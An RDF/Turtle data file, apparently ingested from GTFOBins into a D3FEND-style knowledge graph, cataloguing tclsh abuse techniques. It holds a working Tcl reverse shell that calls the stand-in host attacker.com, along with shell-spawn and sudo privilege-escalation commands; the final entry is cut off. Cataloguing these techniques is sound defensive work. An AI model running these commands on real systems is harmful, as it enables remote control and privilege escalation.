mknd:command_tclsh-non-interactive-reverse-shell a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "tclsh-non-interactive-reverse-shell" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description "Run `nc -l -p 12345` on the attacker box to receive the shell." ;
    d3f:uses mknd:executable_tclsh ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_tclsh ;
    mknd:provides mknd:function_non-interactive-reverse-shell ;
    mknd:value """export RHOST=attacker.com
export RPORT=12345
echo 'set s [socket $::env(RHOST) $::env(RPORT)];while 1 { puts -nonewline $s "> ";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | tclsh
""" .

mknd:command_tclsh-shell a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "tclsh-shell" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:uses mknd:executable_tclsh ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_tclsh ;
    mknd:provides mknd:function_shell ;
    mknd:value """tclsh
exec /bin/sh <@stdin >@stdout 2>@stderr
""" .

mknd:command_tclsh-sudo a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "tclsh-sudo" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:uses mknd:executable_tclsh ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_tclsh ;
    mknd:provides mknd:function_sudo ;
    mknd:value """sudo tclsh
exec /bin/sh <@stdin >@stdout 2>@stderr
""" .

mknd:command_tclsh-suid a d3f:Command,
